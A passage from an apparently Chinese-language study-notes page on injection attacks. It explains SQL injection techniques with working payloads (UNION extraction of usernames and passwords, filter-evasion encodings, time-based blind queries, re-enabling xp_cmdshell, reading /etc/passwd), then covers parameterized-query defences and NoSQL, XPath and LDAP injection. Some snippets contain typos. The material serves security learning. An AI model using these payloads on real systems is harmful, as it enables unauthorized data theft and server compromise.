class="language-bash">Oracle: <span class="token string">'serv'</span><span class="token operator">||</span><span class="token string">'ices'</span>MS-SQL: <span class="token string">'serv'</span>+<span class="token string">'ices'</span>MySQL: <span class="token string">'serv'</span> <span class="token string">'ices'</span><span class="token punctuation">(</span>中间有间隔<span class="token punctuation">)</span></code></pre><p>如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据项会在目标数据库中的求值结果为0，在其他数据库中则会导致错误。</p><pre class=" language-bash"><code class="language-bash">Oracle: BITAND<span class="token punctuation">(</span>1,1<span class="token punctuation">)</span>-BITAND<span class="token punctuation">(</span>1,1<span class="token punctuation">)</span>MS-SQL: @@PACK_RECEVIED-@@PACK_RECEVIEDMySQL: CONNECTION_ID<span class="token punctuation">(</span><span class="token punctuation">)</span>-CONNECTION_ID</code></pre><p>在识别数据库时，MySQL如何处理某些行内注释(inline comment)也是一个值得关注的问题。如果一个注释以！开头，接着是数据库版本字符串，那么只要数据库的实际版本等于或高于那个字符串，应用程序就会将注释内容解释为SQL；否则，应用程序就会忽略注释内容，将它作为注释处理。例如，如果使用的MySQL版本高于或等于3.23.02，注入下面的字符串将会使SELECT语句的WHERE子句为假</p><pre class=" language-bash"><code class="language-bash">/*<span class="token operator">!</span>32302 and 1<span class="token operator">=</span>0*/</code></pre><blockquote><p>注：MS-SQL和Sybase数据库起源相同，绝大多数针对MS-SQL的攻击技巧同样适用于Sybase</p></blockquote><h3 id="UNION操作符"><a href="#UNION操作符" class="headerlink" title="UNION操作符"></a>UNION操作符</h3><p>SQL使用UNION连接符将两个及以上的SELECT语句组合到独立的一个结果中。如果一个Web应用程序的SELECT语句存在SQL注入漏洞，通常可以使用UNION操作符执行另一次完全独立的查询，并将它的结果与第一次查询的结果组合在一起。如果应用程序向浏览器返回查询结果，那么就可以使用这种技巧从应用程序中提取任意数据。所有的主流DBMS产品者支持UNION，对于直接返回查询结果的情况，UNION是检索信息最快的方式<br>如下查询语句：</p><pre class=" language-bash"><code class="language-bash">SELECT author,title,year FROM books WHERE publisher<span class="token operator">=</span><span class="token string">'Wiley'</span></code></pre><p>当对此语句注入以下语句时，能够从另一个完全不同的数据库表中提取数据：</p><pre class=" language-bash"><code class="language-bash">Wiley' UNION SELECT username,password,uid FROM users--</code></pre><p>应用程序将执行以下查询：</p><pre class=" language-bash"><code class="language-bash">SELECT author,title,year FROM books WHERE publisher<span class="token operator">=</span><span class="token string">'Wiley'</span> UNION SELECT username,password,uid FROM users--'</code></pre><h4 id="两个重要的UNION工作机制"><a href="#两个重要的UNION工作机制" class="headerlink" title="两个重要的UNION工作机制"></a>两个重要的UNION工作机制</h4><ul><li>如果使用UNION操作符组合两个查询的结果，这两个结果必须结构相同，也就是说它们的列数必须相同，必须使用按相同顺序出现的相同或兼容的数据类型</li><li>为注入另一个返回有用结果的查询，攻击者必须知道他所针对的数据库表的名称以及有关列的名称。</li></ul><p>如果攻击者试图注入另一个列内数据类型不兼容的查询，会产生错误。</p><h4 id="推测查询表结构"><a href="#推测查询表结构" class="headerlink" title="推测查询表结构"></a>推测查询表结构</h4><p>在许多现实例子中，数据库返回的错误消息将被应用程序截获，并不显示在用户的浏览器上，因此，如果想要查明第一个查询的结构，也许只能纯粹靠猜测，但是可以利用以下三点帮助简化这项任务</p><ul><li>为时注入的查询能够与第一个查询结合，它不一定要使用完全相同的数据类型。但是，它们必须互相兼容，也就是说，第二个查询中的每种数据类型要么必须与第一个查询中的对应类型完全相同，要么必须隐含第转换到那个类型。数据库会将一个数字值隐含地转换为一个字符串值。实际上，NULL可以被转换为任何数据类型，如果不知道某个特殊字段的数据类型，只需在那个字段输入“SELECT NULL”</li><li>如果数据库返回的错误信息被应用程序截获，还是可以轻易确定注入的查询是否得以执行，因此，如果查询已经执行，那么应用程序第一个查询返回的结果后面会增加其他结果。因此据此进行系统的推测，直到查明需要注入的查询结构</li><li>许多时候，只需在第一个查询中确定一个使用字符串数据类型的字段就能达到自己的目的。这足以允许注入任意返回字符串数据的查询并获得其结果，帮助系统性地从数据库中提取出任何想要的数据</li></ul><blockquote><p>注：在Oracle数据库中，每个SELECT语句必须包含一个FROM属性，因此，无论列数是否正确，注入UNION SELECT NULL将产生错误，可以选择使用全局可访问表(globally accessible table)DUAL来满足这一要求。例如：</p></blockquote><pre class=" language-bash"><code class="language-bash">' UNION SELECT NULL FROM DUAL--</code></pre><h4 id="提取数据库版本信息"><a href="#提取数据库版本信息" class="headerlink" title="提取数据库版本信息"></a>提取数据库版本信息</h4><p>如果已经确定注入的查询所需列数，并且已经找到一个使用字符串数据类型的列，就能够提取出任意数据。一个简单的概念验证测试是提取数据库的版本字符串数据，可以在MS-SQL和MySQL中注入以下查询提取数据库版本</p><pre class=" language-bash"><code class="language-bash">' UNION SELECT @@version,NULL,NULL--</code></pre><p>对Oracle注入以下查询将得到相同结果：</p><pre class=" language-bash"><code class="language-bash">' UNION SELECT banner,NULL,NULL FROM <span class="token function">v</span><span class="token variable">$version</span>--</code></pre><h3 id="提取有用数据"><a href="#提取有用数据" class="headerlink" title="提取有用数据"></a>提取有用数据</h3><p>为了从数据库提取有用的数据，通常需要了解表以及包含欲访问的数据所属列的名称。大型企业的DBMS中包含大量的数据数据库元数据，可以查询这些数据查明数据库中每一个表和列的名称。</p><h3 id="避开过滤"><a href="#避开过滤" class="headerlink" title="避开过滤"></a>避开过滤</h3><p>有时，易受SQL注入攻击的应用程序可能会执行各种输入过滤以防止攻击者无限制第利用其中缺陷。例如，应用程序会删除或净化某些字符，或阻止常用的SQL关键字。避开这种过滤有如下技巧：</p><h4 id="避免使用被阻止的字符"><a href="#避免使用被阻止的字符" class="headerlink" title="避免使用被阻止的字符"></a>避免使用被阻止的字符</h4><p>如果应用程序删除或编码某些SQL注入攻击常用的字符，不使用这些字符仍然能够实施攻击。</p><ul><li>如果要注入数字数据字段或列名称，不一定使用单引号。可以通过各种字符串函数，使用每个字符的ASCII代码动态构建一个字符串。如下面两个查询语句：<pre class=" language-bash"><code class="language-bash">Oracle: SELECT ename,sal FROM emp WHERE ename<span class="token operator">=</span>CHR<span class="token punctuation">(</span>109<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>97<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>114<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>99<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>117<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>115<span class="token punctuation">)</span>MS-SQL: SELECT ename,sal FROM emp WHERE ename<span class="token operator">=</span>CHAR<span class="token punctuation">(</span>109<span class="token punctuation">)</span>+CHAR<span class="token punctuation">(</span>97<span class="token punctuation">)</span>+CHAR<span class="token punctuation">(</span>114<span class="token punctuation">)</span>+CHAR<span class="token punctuation">(</span>99<span class="token punctuation">)</span>+CHAR<span class="token punctuation">(</span>117<span class="token punctuation">)</span>+CHAR<span class="token punctuation">(</span>115<span class="token punctuation">)</span>以上查询均等同于SELECT ename,sal FROM emp WHERE ename<span class="token operator">=</span><span class="token string">'marcus'</span> </code></pre></li><li>如果注释符号被阻止，通常可以设计注入的数据，失去不会破坏周围查询的语法<pre class=" language-bash"><code class="language-bash">可以不用注入 <span class="token string">' OR 1=1--可以注入     '</span> OR <span class="token string">'a'</span><span class="token operator">=</span>'a</code></pre></li><li>在MS-SQL数据库中注入批量查询时，不必使用分号分隔符，只要纠正所有批量查询的语法，无论你是否使用分号，查询解释器都会正确解释它们。</li></ul><h4 id="避免使用简单确认"><a href="#避免使用简单确认" class="headerlink" title="避免使用简单确认"></a>避免使用简单确认</h4><p>一些输入确认机制使用一个简单的黑名单，阻止或删除任何出现在这个名单中的数据。例如，如果SELECT关键字被阻止或删除，可以尝试如下输入：</p><pre class=" language-bash"><code class="language-bash">SeLeCt%00SELECTSELSELECTECT%53%45%4C%45%43%54%2553%2545%254c%2545%2543%2554</code></pre><h4 id="使用SQL注释"><a href="#使用SQL注释" class="headerlink" title="使用SQL注释"></a>使用SQL注释</h4><p>在SQL语句中插入行内注释，注释内容在“/* * /”之间。如果应用程序阻止或删除输入中的空格，可以使用注释“冒充”注入数据之间的空白符，如：</p><pre class=" language-bash"><code class="language-bash">SELECT/*foo*/username,password/*foo*/FROM/*foo*/users</code></pre><p>在MySQL中，注释甚至可以插入关键字，这种方法可以避开某些输入确认过滤，同时保留查询中的语法。例如：</p><pre class=" language-bash"><code class="language-bash">SEL/*foo*/ECT username,password FR/*foo*/OM <span class="token function">users</span></code></pre><h4 id="利用有缺陷的过滤"><a href="#利用有缺陷的过滤" class="headerlink" title="利用有缺陷的过滤"></a>利用有缺陷的过滤</h4><p>利用输入确认机制通常包含逻辑缺陷，可对这些缺陷加以利用，使被阻止的输入避开过滤。多数情况下，这类攻击会利用应用程序在对多个确认步骤进行排序，或未能以递归方式应用净化逻辑方面的缺陷。</p><h3 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h3><p>一种特别有效的避开过滤的方法与二阶SQL注入有关。当数据首次插入数据库时，许多应用程序能够安全处理这些数据。但是，数据一旦存储在数据库中，随后应用程序本身或其他后端进程可能以危险的方式处理这些数据。<br>在一些应用程序中，用户输入在到达时通过转义单引号来进行确认。如，当用户输入O’Reilly时，应用程序执行以下查询：</p><pre class=" language-bash"><code class="language-bash">SELECT author,title,year FROM books WHERE publisher<span class="token operator">=</span><span class="token string">'O'</span><span class="token string">'Reilly'</span></code></pre><p>在这个查询中，用户提交的单引号被转换为两个单引号，因而传送给数据库的搜索项与用户最初输入的表达式具有相同的字符含义。只有在字符串被传送给数据库时才会使用配对的转义序列。因此，当应用程序重复使用这个字符串并将它嵌入另一个查询时，就会造成一个SQL注入漏洞</p><h3 id="高级利用"><a href="#高级利用" class="headerlink" title="高级利用"></a>高级利用</h3><p>如今，即使遇到SQL注入漏洞，攻击者仍然无法直接获取注入的查询的结果。下面将对此种情形进行讨论</p><h4 id="获取数字数据"><a href="#获取数字数据" class="headerlink" title="获取数字数据"></a>获取数字数据</h4><p>如果包含单引号的输入得到正确处理，那么应用程序中的字符串字段就不易受到SQL注入攻击。但是，数字数据字段可能仍然存在漏洞。在这种字段中，用户输入并不包含在单引号内。这时攻击者只有通过应用程序的数值响应(numeric response)才能获得注入查询的结果<br>在这种情况下，攻击者需要做的就是获取数字形式的有用数据，对注入查询的结果进行处理。他们可以使用以下两个关键函数：</p><ul><li>ASCII，它返回输入字符的ASCII码</li><li>SUBSTRING(或Oracle中的SUBSTR)，它返回输入的子字符串<br>这些函数可结合在一起使用，以数字形式从一个字符串中提取一个字符。如：<pre class=" language-bash"><code class="language-bash">SUBSTRING<span class="token punctuation">(</span><span class="token string">'Admin'</span>,1,1<span class="token punctuation">)</span>返回AASCII<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span>返回65ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token string">'Admin'</span>,1,1<span class="token punctuation">))</span>返回65</code></pre>使用这两个函数，可以系统地将一个有用数据的字符串分割成单个字符，并以数字的形式分别返回每一个字符。在自定义攻击中，可以利用这个技巧，以一次一个字节的速度，迅速获得并重建大量基于字符串的数据</li></ul><h4 id="使用带外通道"><a href="#使用带外通道" class="headerlink" title="使用带外通道"></a>使用带外通道</h4><p>在许多SQL注入攻击中，应用程序并不在用户的浏览器中显示注入查询的结果，也不返回数据库生成的任何错误信息。但是，即使出现这种情况，仍然可以使用使用各种技巧获取数据、确认其他恶意操作是否取得成功。<br>在这种情况下，一种获取数据的有效方法是使用带外通道。能够在数据库中执行任意SQL语句后，渗透测试员往往可以利用数据库的一些内置功能在数据库和自己的计算机之间建立网络连接，通过它传送从数据库中收集到的任何数据。<br>建立适当的网络连接的方法依不同的数据库而定，而且取决于应用程序访问数据库所用的用户权限。下面将描述一些使用每种数据库时最常用、最有效的技巧。</p><h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><p>Oracle包含大量低权限用户可访问的默认功能，可以使用它们建立带外连接。</p><ul><li>UTL_HTTP包可用于向其他主机提出HTTP请求。如果攻击者已经攻破一个企业内部网络中的数据库，他就能利用企业代理服务器与因特网建立外部连接</li><li>UTL_INADDR包旨在将主机名解析为IP地址。它可以利用于在攻击者控制的服务器中生成任意的DNS查询</li><li>UTL_SMTP包可用于发送电子邮件。在出站电子邮件中发送这个包，即可获得大量从数据库中截取的数据</li><li>UTL_TCP包可用于打开任意TCP套接字，以发送和接收网络数据。</li></ul><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><p>SELECT…INTO OUTFILE命令可将任意一个查询的输出指向一个文件。指定的文件名可包含UNC(Universal Naming Convention，通用命名规则)路径，允许将输出指向自己计算机上的一个文件。<br>要想接收到文件，必须在计算机上建立SMB共享，允许匿名写入访问</p><h5 id="利用操作系统"><a href="#利用操作系统" class="headerlink" title="利用操作系统"></a>利用操作系统</h5><p>通常可以在数据库服务器的操作系统上执行任意命令，以此实施权限提升攻击。</p><h4 id="使用推论：条件式响应"><a href="#使用推论：条件式响应" class="headerlink" title="使用推论：条件式响应"></a>使用推论：条件式响应</h4><p>造成带外通道不可用的原因很多，大多数情况下，是因为数据库处于一个被保护的网络中，它的边界防火墙禁止任何与因特网或其他网络的带外连接。这时，只能通过Web应用程序注入点(injection point)访问数据库。这些技巧全都基于如下概念：使用一个注入查询有条件地在数据库中触发某种可以探测的行为，然后根据这种行为是否发生推断出以下信息</p><h5 id="引发条件性错误"><a href="#引发条件性错误" class="headerlink" title="引发条件性错误"></a>引发条件性错误</h5><p>核心理念:注入一个查询，依照某个特定的条件引发一个数据库错误。如果发生数据库错误，可以通过HTTP500响应码，或者通过某种错误信息或反常行为，从外部探测到这个错误<br>这种技巧利用了数据库在求条件语句的值时表现出的一个行为特点：数据库将根据其他部分的情况，仅对那些需要求值的语句部分求值。包含WHERE子句的SELECT语句就是表现出这种行为的一个典型示例：</p><pre class=" language-bash"><code class="language-bash">SELECT x FROM y WHERE c</code></pre><p>这条语句时数据库访问表y的每一行，评估条件c。如果c为真，返回x。如果条件c永为假，永远求不出表达式x的值，也不会发生错误。因此，可以通过是否发生错误测试任意一个条件c。下面的查询检查虚构用户AAA是否存在：</p><pre class=" language-bash"><code class="language-bash">SELECT 1/0 FROM WHERE <span class="token punctuation">(</span>SELECT username FROM all_users WHERE username<span class="token operator">=</span><span class="token string">'AAA'</span><span class="token punctuation">)</span></code></pre><p>如果WHERE的条件username=’AAA’永为假，就不会求表达式1/0的值，因而不会发生错误。如果为真，就会对表达式1/0求值，进而产生错误。<br>这种技巧应用非常广泛，因为它可以用在可以注入子查询的各种注入点中。</p><h5 id="使用时间延迟"><a href="#使用时间延迟" class="headerlink" title="使用时间延迟"></a>使用时间延迟</h5><p>攻击者可以提交他设计的查询，然后监控服务器做出响应所花的时间。如果发生延迟，攻击者可以推测条件为真。即使在两种情况下服务器的响应完全相同，攻击者仍然可以根据是否存在时间延迟从数据库中提取一比特数据。通过大量执行这类查询，攻击者就能系统地从数据库中提取任何复杂的数据，每次一比特。</p><p>在MS-SQL中：</p><ol><li>使用内置命令：引发适当时间延迟方法的精确性取决于所使用的目标数据库。MS-SQL中包含一个内置命令WAITFOR，可用于引起一个指定的时间延迟。如，如果下面的查询引发一次时间延迟，表示被截取的字符串的第一个字母为A<pre class=" language-bash"><code class="language-bash"><span class="token keyword">if</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token string">'Admin'</span>,1,1<span class="token punctuation">))</span> <span class="token operator">=</span> 65 WAITFOR dalay <span class="token string">'0:0:5'</span></code></pre></li><li>划分数据：将每个字节的数据划分成比特，并在每次查询中获得一比特数据。POWER命令与按位“与”运算符&amp;可在逐比特的基础上指定条件。例如，以下查询测试被截获数据的第一字节的第一比特，如果其值为1，则终止查询：<pre class=" language-bash"><code class="language-bash"><span class="token keyword">if</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token string">'Admin'</span>,1,1<span class="token punctuation">))</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>POWER<span class="token punctuation">(</span>2,0<span class="token punctuation">))</span> <span class="token operator">></span> 0 WAITFOR delay <span class="token string">'0:0:5'</span> //POWER<span class="token punctuation">(</span>2,0<span class="token punctuation">)</span><span class="token operator">=</span>2^0,因为一比特是一个二进制位，所以使用2</code></pre>下面对第二比特进行相同的测试：<pre class=" language-bash"><code class="language-bash"><span class="token keyword">if</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token string">'Admin'</span>,1,1<span class="token punctuation">))</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>POWER<span class="token punctuation">(</span>2,1<span class="token punctuation">))</span> <span class="token operator">></span> 0 WAITFOR delay <span class="token string">'0:0:5'</span></code></pre></li></ol><p>MySQL:使用睡眠函数<br>Oracle:使用UTL_HTTP连接一个不存在的服务器，造成一次操作超时。这会使数据库尝试与指定的服务器建立连接，并最终造成超时。</p><h3 id="SQL注入之外：扩大数据库攻击范围"><a href="#SQL注入之外：扩大数据库攻击范围" class="headerlink" title="SQL注入之外：扩大数据库攻击范围"></a>SQL注入之外：扩大数据库攻击范围</h3><p>通过扩大数据库攻击范围可以实施的其他攻击如下：</p><ul><li>如果数据库被其他应用程序共享，可以通过提升数据库的使用访问权限访问其他应用程序的数据</li><li>可以攻破数据库服务器的操作系统</li><li>可以访问其他系统。通常，数据库服务器是在一个几层网络边界防御保护下的网络中的主机。如果能够控制数据库服务器，攻击者就会在一个可信的位置上，可以访问其他主机上的关键服务，并对其加以利用。</li><li>可以在主机基础架构与自己的计算机之间建立网络连接。</li><li>可以通过创建用户定义的功能任意扩充数据库的现有功能。有些时候，可以通过这种方式重新执行已被删除或禁用的功能，避开数据库实施的强制保护措施。只要已经获得数据库管理员(DBA)的权限，就有办法在每种数据库中执行这种操作</li></ul><h4 id="MS-SQL"><a href="#MS-SQL" class="headerlink" title="MS-SQL"></a>MS-SQL</h4><p>最常被攻击者滥用的数据库功能是xp_cmdshell存储过程，它是MS-SQL默认内置的一项功能。这个存储过程允许数据库管理员用户以和cmd.exe命令提示符相同的方式执行操作系统命令。例如：</p><pre class=" language-bash"><code class="language-bash">master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">'ipconfig > foo.txt'</span></code></pre><p>攻击者可在众多情况下滥用这项功能。</p><ul><li>他们可以执行任意命令，将结果指向本地文件，然后读取文件内容。</li><li>打开一个可以连通自己计算机的带外网络连接，并建立一条秘密的命令和通道，从服务器复制数据并上传攻击工具。</li><li>由于MS-SQL默认以LocalSystem运行，攻击者一般能够完全攻破基本的操作系统，执行任意操作。</li></ul><h5 id="处理默认锁定"><a href="#处理默认锁定" class="headerlink" title="处理默认锁定"></a>处理默认锁定</h5><p>互联网上的大多数MS-SQL为更高版本，这些版本提供各种安全功能，可以在默认情况下锁定数据库，防止各种攻击。<br>但是，如果数据库中的Web应用程序用户账户拥有足够高的权限，则通过重新设置数据库，该用户就可以突破上述功能实施的限制。例如，可以使用sp_configure存储过程重新启用被禁用的xp_cmdshell。以下四行SQL代码用于实现这一目的：</p><pre class=" language-bash"><code class="language-bash">EXECUTE sp_configure <span class="token string">'show advanced potions'</span>, 1RECONFIGURE WITH OVERRIDEEXECUTE sp_configure <span class="token string">'xp_cmdshell'</span>, <span class="token string">'1'</span>RECONFIGURE WITH OVERRIDE</code></pre><p>这样，xp_cmdshell就被重新启用，并可以通过以下命令运行：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> xp_cmdshell <span class="token string">'dir'</span></code></pre><h4 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h4><p>Oracle包含大量默认功能，这些功能可被低权限用户访问，并用于执行各种敏感操作，如建立网络连接或访问文件系统。UTL_FILE包可用于在数据库服务器文件系统上读取和写入文件。</p><h4 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h4><p>与前面的数据库相比，MySQL中包含的可被攻击者滥用的内置功能相对较少，其中一个示例是任何拥有FILE_PRIV许可的用户都可以读取并写入文件系统。<br>LOAD_FILE命令可以用于获取任何文件的内容。例如：</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">select</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span></code></pre><p>SELECT…INTO OUTFILE命令可用于将任何一个查询的输出指向一个文件<br>出读取并写入关键的操作系统文件外，这些命令还可以用于指向其他攻击。</p><ul><li>因为MySQL将数据保存在明文文件中，数据库必须拥有读取这些文件的权限。拥有FILE_PRIV许可的攻击者可以打开相关文件并读取数据库中的任何数据，避开数据库实施的任何访问控制</li><li>MySQL允许用户通过调用一个包含函数执行过程的编译文件库文件创建一个用户定义的函数(UDF)。这个文件必须位于MySQL加载动态库的正常路径内，攻击者可以在这个路径中创建任意二进制文件，然后建立使用这个文件的UDF。</li></ul><h3 id="使用SQL注入工具"><a href="#使用SQL注入工具" class="headerlink" title="使用SQL注入工具"></a>使用SQL注入工具</h3><p>当前，多数工具通过以下方法来利用SQL注入漏洞</p><ul><li>对目标请求中的参数实施蛮力攻击，以查找SQL注入点</li><li>通过附加各种字符,如闭括号、注释字符和SQL关键字，确定后端SQL查询中易受攻击字段的位置</li><li>通过蛮力猜测请求的列数，然后确定包含varchar数据类型的列(可用于返回结果)，尝试UNION攻击</li><li>注入定制查询来检索任意数据——如果需要，将多个列的数据串连成一个字符串，以便于从单独一个varchar类型数据的结果中进行检索</li><li>如果无法使用UNION检索结果，可以在查询中注入布尔型条件(AND 1=1 、AND 1=2等)。以确定是否可以使用条件响应来检索数据</li></ul><h3 id="防止SQL注入"><a href="#防止SQL注入" class="headerlink" title="防止SQL注入"></a>防止SQL注入</h3><h4 id="部分有效的防御措施"><a href="#部分有效的防御措施" class="headerlink" title="部分有效的防御措施"></a>部分有效的防御措施</h4><p>由于单引号在SQL注入漏洞中占有突出的地位，防御这种攻击的一种常用方法，就是将用户输入中的任何单引号配对，对它们进行转义，但是，在下面两种情况下，这种方法无效:</p><ul><li>如果用户提交的数字数据内置在SQL查询中，这种数据通常并不包含在单引号内。因此，攻击者能够破坏数据的使用环境并开始输入任意的SQL查询，这时就不必输入单引号</li><li>在二阶SQL注入中，最初在插入数据库中时已经安全转义的数据随后被从数据库中读取出来，然后又再次写入。当重新使用数据时，最初配对的引号又恢复到单引号形式。</li></ul><h4 id="参数化查询"><a href="#参数化查询" class="headerlink" title="参数化查询"></a>参数化查询</h4><p>大多数数据库和应用程序开发平台都提供API，对不可信的安全输入进行安全处理，以防止SQL注入漏洞。参数化查询(也叫预处理语句)分两个步骤建立一个包含用户输入的SQL语句</p><ul><li>应用程序指定查询结构，为用户输入的每个数据预留占位符</li><li>应用程序指定每个占位符的内容<br>在第二个步骤中指定的专门设计的数据无法破坏在第一个步骤中指定的查询结构。因为查询结构已经确定，且相关API对所有类型的占位符数据进行安全处理，因此它总被解释为数据，而不是语句结构的一部分<br>使用参数查询化可有效防止SQL注入，但还要注意以下几个重要限制：</li><li>应在每个数据库查询中使用参数化查询</li><li>插入查询中的每一种数据都应适当进行参数化</li><li>参数占位符不能用于指定查询中表和列的名称</li><li>参数占位符不能用于查询的任何部分</li></ul><h4 id="深层防御"><a href="#深层防御" class="headerlink" title="深层防御"></a>深层防御</h4><p>一种稳定的安全机制应该采用深层次防御措施提供额外的保护，以防止前端防御由于任何原因失效。当防御针对后端数据库的攻击时，应采用另外三层防御。</p><ul><li>当访问数据库时，应用程序应尽量使用最低权限的账户 </li><li>许多企业数据库包含大量默认功能，可被能够执行任意SQL语句的攻击者有用。</li><li>应评估、测试并及时安装供应商发布的所有安全补丁，以修复数据库软件本身已知漏洞。</li></ul><h2 id="注入NoSQL"><a href="#注入NoSQL" class="headerlink" title="注入NoSQL"></a>注入NoSQL</h2><p>术语NoSQL用于指各种不同于标准的关系数据库体系架构的数据存储区。NoSQL数据存储区呈现使用键/值映射的数据，并且不依赖于固定的方案，键和值可以任意定义，而且值的格式通常与数据存储区无关。以下是NoSQL数据存储区采用的一些常用查询方法：</p><ul><li>键/值查询</li><li>XPath</li><li>编程语言(如JavaScript)</li></ul><h3 id="注入MongoDB"><a href="#注入MongoDB" class="headerlink" title="注入MongoDB"></a>注入MongoDB</h3><p>许多NoSQL数据库利用现有的编程语言来提供灵活、可编程的查询机制。如果使用字符串连接构建查询，攻击者就可以尝试破坏数据并更改查询的语法。以下面的查询为例，它基于MongoDB数据存储区中的用户记录进行登录</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$js</span> <span class="token operator">=</span> "function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> this.username<span class="token operator">=</span><span class="token string">'<span class="token variable">$username</span>'</span> <span class="token operator">&amp;</span> this.password<span class="token operator">=</span><span class="token string">'<span class="token variable">$password</span>'</span><span class="token punctuation">}</span></code></pre><p>$js是一个JavaScript函数，其代码是动态创建的，并且包含用户提交的用户名和密码。攻击者可以通过提供以下用户名和任意密码来避开验证逻辑：</p><pre class=" language-bash"><code class="language-bash">Alice'//</code></pre><p>生成的javaScript函数如下：</p><pre class=" language-bash"><code class="language-bash">function<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> this.username<span class="token operator">=</span><span class="token string">'Alice'</span>//<span class="token string">' &amp; this.password='</span>aaa'<span class="token punctuation">;</span>  //在javaScript中//是注释符号，因此语句//后所有代码都被注释！ <span class="token punctuation">}</span></code></pre><h2 id="注入XPath"><a href="#注入XPath" class="headerlink" title="注入XPath"></a>注入XPath</h2><p>XPath(XML路径语言)是一种用于导航XML文档并从中获取数据的解释型语言。许多时候，一个XPath表达式代表由一个文档节点导航到另一个文档节点所需要的一系列步骤。如果Web应用程序将应用程序保存在XML文档中，那么它们可能使用XPath访问数据，以响应用户提交的输入。如果这个输入未经过任何过滤或净化就插入到XPath查询中，攻击者就可以通过控制查询来破坏应用程序的逻辑，或者获取未授权访问的数据。</p><blockquote><p>注：与SQL注入一样，注入一个数字值时不需要单引号。与SQL查询不同的是，XPath查询中的关键字区分大小写，XML文档中的元素名也区分大小写</p></blockquote><h2 id="注入LDAP"><a href="#注入LDAP" class="headerlink" title="注入LDAP"></a>注入LDAP</h2><p>LDAP(Lightweight Directory Access Protocol,轻量级目录访问协议)用于访问网络中的目录服务。目录是一个分级结构的数据存储区，其中可能包含任何类型的信息。LDAP还常用在企业内联网Web应用程序中，如允许用户查看并修改雇员信息的人力资源应用程序。<br>每个LDAP查询使用一个或多个搜索过滤器，它们决定了请求返回的目录项。搜索过滤器可以使用各种逻辑运算符来表示复杂的搜索条件。最常用的搜索过滤器如下：</p><ul><li>简单匹配条件：对单个属性的值进行匹配，通过用户名搜索：<br><font color="#fb8c00">(username=daf)</font></li><li>析取查询：指定多个条件。返回的目录项必须满足其中任何一个条件。<br><font color="#fb8c00">(|(cn=searchterm)(sn=searchterm)(ou=searchterm)</font></li><li>合取查询：指定多个条件，返回目录时必须同时满足这些条件<br><font color="#fb8c00">(&amp;(username=daf)(password=secret))</font></li></ul><p>与SQL注入漏洞相比,LDAP注入漏洞更难以被攻击者利用，原因如下：</p><ul><li>搜索过滤器采用逻辑运算符来指定析取和合取查询的位置通常位于用户提交数据的插入位置之前，因而无法修改。因此，简单匹配条件和合取查询不会受到SQL注入类似”or 1=1”类型的攻击</li><li>在常用的LDAP服务中，返回的目录属性将作为搜索过滤器中的独立参数传递给LDAP API，并且通常在应用程序中进行了硬编码。因此，攻击者无法通过修改用户提交的输入来检索和查询检索的属性不同的属性</li><li>应用程序很少返回有用的错误信息。因此，通常攻击者只能“盲目”利用各种漏洞</li></ul><h3 id="利用LDAP进行注入"><a href="#利用LDAP进行注入" class="headerlink" title="利用LDAP进行注入"></a>利用LDAP进行注入</h3><h4 id="析取查询"><a href="#析取查询" class="headerlink" title="析取查询"></a>析取查询</h4><p>应用程序执行的一项析取查询如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token operator">|</span><span class="token punctuation">(</span>username<span class="token operator">=</span>London sales<span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token operator">=</span>Reading sales<span class="token punctuation">))</span></code></pre><p>这里，应用程序构建了一个析取查询，并在用户提交输入之前牵制了一些表达式来执行所需访问的访问控制。在这种情况下，攻击者可以通过提交以下搜索项对查询进行修改：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token operator">=</span>*</code></pre><ul><li>是LDAP的通配符，可匹配任何数据项。如果将这个输入嵌入到LDAP搜索过滤器中，应用程序将执行以下查询，进而返回所有信息：<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token operator">|</span><span class="token punctuation">(</span>username<span class="token operator">=</span>London<span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token operator">=</span>*<span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token operator">=</span>Reading<span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token operator">=</span>*<span class="token punctuation">))</span></code></pre></li></ul><h4 id="合取查询"><a href="#合取查询" class="headerlink" title="合取查询"></a>合取查询</h4><p>应用程序执行的一项合取查询如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>givenName<span class="token operator">=</span>daf<span class="token punctuation">)</span><span class="token punctuation">(</span>department<span class="token 